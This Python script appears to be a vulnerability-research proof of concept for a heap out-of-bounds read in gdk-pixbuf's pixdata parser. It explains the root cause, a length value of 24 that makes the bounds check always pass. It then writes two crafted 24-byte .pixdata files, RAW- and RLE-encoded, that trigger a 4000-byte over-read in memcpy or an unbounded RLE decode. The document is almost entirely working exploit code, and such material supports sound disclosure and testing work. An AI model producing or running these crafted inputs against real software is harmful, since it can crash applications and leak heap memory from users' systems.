#!/usr/bin/env python3
"""
PoC generator for VULN-001: Heap OOB Read in gdk_pixbuf_from_pixdata() via
crafted GdkPixdata blob that bypasses the pixel-data length check.

Root cause (gdk-pixdata.c line 235):
  if (stream_length < pixdata->length - GDK_PIXDATA_HEADER_LENGTH)
      return_pixel_corrupt(error);

When pixdata->length == GDK_PIXDATA_HEADER_LENGTH (24), the RHS evaluates to 0.
stream_length (guint) < 0 is always false, bypassing the check.
pixdata->pixel_data then points just past the end of the 24-byte input buffer.

In the RAW path (gdk-pixdata.c ~line 505-507):
  memcpy(data, pixdata->pixel_data, pixdata->rowstride * pixdata->height);
This memcpy reads rowstride*height = 4*1000 = 4000 bytes from pixel_data, which
starts 0 bytes to the right of the heap allocation → heap-buffer-overflow.

In the RLE path (gdk-pixdata.c lines 459-495), the RLE decode loop also reads
from pixel_data unboundedly, but ASAN doesn't catch those 1-byte reads because
GLib's GString typically over-allocates (128-byte block for a 25-byte string),
and the small reads land in the slack. The RAW memcpy(4000 bytes) ensures
the read crosses the allocation boundary and triggers ASAN.

Constants (from gdk-pixdata.h):
  GDK_PIXBUF_MAGIC_NUMBER     = 0x47646b50  ('GdkP', big-endian)
  GDK_PIXDATA_HEADER_LENGTH   = 24
  GDK_PIXDATA_COLOR_TYPE_RGBA = 0x02
  GDK_PIXDATA_SAMPLE_WIDTH_8  = 0x01 << 16 = 0x00010000
  GDK_PIXDATA_ENCODING_RAW    = 0x01 << 24 = 0x01000000
  GDK_PIXDATA_ENCODING_RLE    = 0x02 << 24 = 0x02000000
  pixdata_type (RGBA+8bit+RAW) = 0x01010002
  pixdata_type (RGBA+8bit+RLE) = 0x02010002

All header fields are serialized in network byte order (big-endian).
"""
import struct
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

GDK_PIXBUF_MAGIC_NUMBER   = 0x47646b50
GDK_PIXDATA_HEADER_LENGTH = 24

# Primary: RAW encoding — triggers large memcpy OOB (4000 bytes), ASAN-visible
# pixdata_type = RGBA (0x02) | SAMPLE_WIDTH_8 (0x00010000) | ENCODING_RAW (0x01000000)
PIXDATA_TYPE_RAW = 0x01000000 | 0x00010000 | 0x02  # = 0x01010002

# Alternate: RLE encoding — same bypass, same OOB source; ASAN less reliable
# pixdata_type = RGBA (0x02) | SAMPLE_WIDTH_8 (0x00010000) | ENCODING_RLE (0x02000000)
PIXDATA_TYPE_RLE = 0x02000000 | 0x00010000 | 0x02  # = 0x02010002

def make_header(pixdata_type, width=1, height=1000, rowstride=4):
    """Build a 24-byte GdkPixdata header with length=24 to bypass the check."""
    return struct.pack(
        ">IIIIII",
        GDK_PIXBUF_MAGIC_NUMBER,    # magic: 'GdkP'
        GDK_PIXDATA_HEADER_LENGTH,  # length: 24 = bypass value
        pixdata_type,
        rowstride,
        width,
        height,
    )

# Primary PoC: RAW encoding — provokes memcpy(data, pixel_data, 4000) OOB read
out_raw = os.path.join(SCRIPT_DIR, "vuln_001.pixdata")
header_raw = make_header(PIXDATA_TYPE_RAW)
assert len(header_raw) == GDK_PIXDATA_HEADER_LENGTH
with open(out_raw, "wb") as f:
    f.write(header_raw)
print(f"[+] Wrote {len(header_raw)} bytes to {out_raw}  (RAW encoding)")
print(f"    magic=0x{GDK_PIXBUF_MAGIC_NUMBER:08x} length={GDK_PIXDATA_HEADER_LENGTH} "
      f"pixdata_type=0x{PIXDATA_TYPE_RAW:08x} rowstride=4 width=1 height=1000")
print(f"    Trigger: memcpy(output, pixel_data, 4000) → heap-buffer-overflow READ 4000")

# Secondary PoC: RLE encoding — same bypass, rle_buffer walks OOB in heap slack
out_rle = os.path.join(SCRIPT_DIR, "vuln_001_rle.pixdata")
header_rle = make_header(PIXDATA_TYPE_RLE)
with open(out_rle, "wb") as f:
    f.write(header_rle)
print(f"\n[+] Wrote {len(header_rle)} bytes to {out_rle}  (RLE encoding)")
print(f"    pixdata_type=0x{PIXDATA_TYPE_RLE:08x}")
print(f"    Trigger: RLE decode loop reads rle_buffer past end of input")
print(f"    (ASAN may not fire due to GLib GString over-allocation slack)")
